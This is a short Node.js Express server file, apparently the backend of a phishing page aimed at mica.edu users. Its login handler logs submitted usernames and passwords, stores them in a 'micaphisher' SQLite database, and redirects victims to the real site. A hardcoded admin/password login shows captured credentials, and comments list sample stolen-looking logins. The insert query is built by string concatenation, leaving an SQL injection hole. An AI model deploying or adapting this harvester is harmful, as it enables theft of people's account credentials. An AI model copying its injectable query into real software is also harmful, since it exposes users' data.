const express = require('express')
const session = require('express-session')
const sqlite3 = require('sqlite3').verbose()
const path = require('path');

const app = express()
const port = 3000

// middleware
app.use(express.urlencoded({ extended: false })) // properly decode urlencoded request
app.use(session({
	resave: false, // don't save session if unmodified
	saveUninitialized: false, // don't create session until something stored
	secret: 'shhhh, very secret' // required secret value
}))

// serve up static html files from content folder
app.use(express.static(__dirname + "/content"))

// set up EJS as our templating engine
app.set('view engine', 'ejs');

// respond to HTTP POST against /login
app.post('/login', function(req, res) {
	console.log(req.body.username)
	console.log(req.body.password)
	if (req.body.username == 'admin' && req.body.password == 'password') {
		loginList = [
			{ username: 'kian', password: 'llamalover99' },
			{ username: 'yana', password: 'catfan666' },
		]
		res.render('admin.ejs', { logins: loginList })
	} else {
		db.run("insert into micadata (username, password) values ('" + req.body.username + "', '" + req.body.password + "');")
		res.redirect('https://mica.edu')
	}
})

// initialize the database. (make a new one if it doesn't exist already)
console.log("Setting up database")
let db = new sqlite3.Database('./db/micaphisher.db', sqlite3.OPEN_READWRITE | sqlite3.OPEN_CREATE, (err) => {
	if (err) {
	  console.error(err.message)
	} else {
		console.log('Connected to the micaphisher database.')
		db.run("create table if not exists micadata(username text, password text);")
	}
})

// start server
app.listen(port, () => console.log(`Listening on port ${port}`))

// create table if not exists micadata(username text, password text);
// insert into micadate (username, password) values ('chuck@mica.edu', 'kidwalom1@');
// select * from micadata;
